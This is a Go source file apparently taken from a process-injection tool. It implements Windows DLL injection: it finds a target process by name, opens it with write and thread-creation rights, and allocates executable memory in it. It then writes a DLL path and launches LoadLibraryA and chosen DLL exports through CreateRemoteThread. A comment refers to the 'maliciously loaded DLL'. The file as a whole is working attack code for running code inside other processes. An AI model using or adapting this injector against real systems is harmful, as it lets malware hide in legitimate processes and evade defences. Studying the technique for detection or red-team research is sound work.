package utils

import (
	"fmt"
	"syscall"
	"unsafe"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"
)

var nullRef int

// StringToCharPtr converts a Go string into pointer to a null-terminated cstring.
// This assumes the go string is already ANSI encoded.
//source code: https://medium.com/@justen.walker/breaking-all-the-rules-using-go-to-call-windows-api-2cbfd8c79724
func StringToCharPtr(str string) *uint8 {
	chars := append([]byte(str), 0) // null terminated
	return &chars[0]
}

/*
Returns the PID of a provided process name by walking all currently running processes
*/
func GetProc(name string) (uint32, error) {
	h, e := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if e != nil {
		return 0, e
	}
	p := windows.ProcessEntry32{Size: ProcessEntrySize}
	for {
		e := windows.Process32Next(h, &p)
		if e != nil {
			return 0, e
		}
		if windows.UTF16ToString(p.ExeFile[:]) == name {
			return p.ProcessID, nil
		}
	}
}

/*
Walks the loaded modules (DLLs) of target process and identifies which matches maliciously loaded DLL.
It then calls a remote thread to execute a remote function within the mdoule by calculating its offset from the base address of the DLL. 
*/
func CallRemoteFunction(i *Inject) error {
	localDllAddr, err := syscall.LoadLibrary(i.DllPath)
	if err != nil {
		return err
	}
	localFunc, err := syscall.GetProcAddress(localDllAddr, i.RemoteFuncName)
	if err != nil {
		return err
	}
	localBase, _, err := getModuleHandleA.Call(uintptr(unsafe.Pointer(StringToCharPtr(i.DllName))))
	if localBase == 0 {
		fmt.Println("[!] Error: ", err)
	}

	moduleList, e := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPMODULE, i.Pid)
	if e != nil {
		return e
	}
	p := windows.ModuleEntry32{Size: ModuleEntrySize}
	windows.Module32First(moduleList, &p)

	for {
		e := windows.Module32Next(moduleList, &p)
		if e != nil {
			return e
		}
		if windows.UTF16ToString(p.Module[:]) == i.DllName {
			i.RemoteFuncHandle = uintptr(localFunc) - uintptr(localBase) + uintptr(p.ModuleHandle)
			remoteThread, _, err := createRemoteThread.Call(i.RemoteProcHandle, uintptr(nullRef), uintptr(0), i.RemoteFuncHandle, uintptr(0), uintptr(0), uintptr(0))
			if remoteThread == 0 {
				fmt.Println("[!] ERROR :", err)
			}
			i.RThread = remoteThread
			return nil
		}
	}
}

func OpenProcessHandle(i *Inject) error {
	var rights uint32 = windows.PROCESS_CREATE_THREAD |
		windows.PROCESS_QUERY_INFORMATION |
		windows.PROCESS_VM_OPERATION |
		windows.PROCESS_VM_WRITE |
		windows.PROCESS_VM_READ
	var inheritHandle uint32 = 0
	var processID uint32 = i.Pid
	remoteProcHandle, _, err := openProcess.Call(
		uintptr(rights),
		uintptr(inheritHandle),
		uintptr(processID))
	if remoteProcHandle == 0 {
		fmt.Println("[!] ERROR :", err)
	}
	i.RemoteProcHandle = remoteProcHandle
	return nil
}

func VirtualAllocEx(i *Inject) error {
	var flAllocationType uint32 = windows.MEM_COMMIT | windows.MEM_RESERVE
	var flProtect uint32 = windows.PAGE_EXECUTE_READWRITE
	lpBaseAddress, _, lastErr := virtualAllocEx.Call(
		i.RemoteProcHandle,
		uintptr(nullRef),
		uintptr(i.DLLSize),
		uintptr(flAllocationType),
		uintptr(flProtect))
	if lpBaseAddress == 0 {
		return errors.Wrap(lastErr, "[!] ERROR : Can't Allocate Memory On Remote Process.")
	}
	i.Lpaddr = lpBaseAddress
	return nil
}

func WriteProcessMemory(i *Inject) error {
	var nBytesWritten *byte
	dllPathBytes, err := syscall.BytePtrFromString(i.DllPath)
	if err != nil {
		return err
	}
	writeMem, _, lastErr := writeProcessMemory.Call(
		i.RemoteProcHandle,
		i.Lpaddr,
		uintptr(unsafe.Pointer(dllPathBytes)), //LPCVOID is a pointer to a buffer of data
		uintptr(i.DLLSize),
		uintptr(unsafe.Pointer(nBytesWritten)))
	if writeMem == 0 {
		return errors.Wrap(lastErr, "[!] ERROR : Can't write to process memory.")
	}
	return nil
}

func GetLoadLibAddress(i *Inject) error {
	var llibBytePtr *byte
	llibBytePtr, err := syscall.BytePtrFromString("LoadLibraryA")
	if err != nil {
		return err
	}
	lladdr, _, lastErr := getProcAddress.Call(
		kernel32dll.Handle(),
		uintptr(unsafe.Pointer(llibBytePtr)))
	if &lladdr == nil {
		return errors.Wrap(lastErr, "[!] ERROR : Can't get process address.")
	}
	i.LoadLibAddr = lladdr
	return nil
}

func CreateRemoteThread(i *Inject) error {
	var threadId uint32 = 0
	var dwCreationFlags uint32 = 0
	remoteThread, _, lastErr := createRemoteThread.Call(
		i.RemoteProcHandle,
		uintptr(nullRef),
		uintptr(0),
		i.LoadLibAddr,
		i.Lpaddr,
		uintptr(dwCreationFlags),
		uintptr(unsafe.Pointer(&threadId)),
	)
	if remoteThread == 0 {
		return errors.Wrap(lastErr, "[!] ERROR : Can't Create Remote Thread.")
	}
	i.RThread = remoteThread
	return nil
}

func WaitForSingleObject(i *Inject) error {
	var dwMilliseconds uint32 = syscall.INFINITE
	var dwExitCode uint32
	rWaitValue, _, lastErr := waitForSingleObject.Call(
		i.RThread,
		uintptr(dwMilliseconds))
	if rWaitValue != 0 {
		return errors.Wrap(lastErr, "[!] ERROR : Error returning thread wait state.")
	}
	success, _, lastErr := getExitCodeThread.Call(
		i.RThread,
		uintptr(unsafe.Pointer(&dwExitCode)))
	if success == 0 {
		return errors.Wrap(lastErr, "[!] ERROR : Error returning thread exit code.")
	}
	closed, _, lastErr := closeHandle.Call(i.RThread)
	if closed == 0 {
		return errors.Wrap(lastErr, "[!] ERROR : Error closing thread handle.")
	}
	return nil
}

func VirtualFreeEx(i *Inject) error {
	var dwFreeType uint32 = windows.MEM_RELEASE
	var size uint32 = 0 //Size must be 0 if MEM_RELEASE all of the region
	rFreeValue, _, lastErr := virtualFreeEx.Call(
		i.RemoteProcHandle,
		i.Lpaddr,
		uintptr(size),
		uintptr(dwFreeType))
	if rFreeValue == 0 {
		return errors.Wrap(lastErr, "[!] ERROR : Error freeing process memory.")
	}
	return nil
}
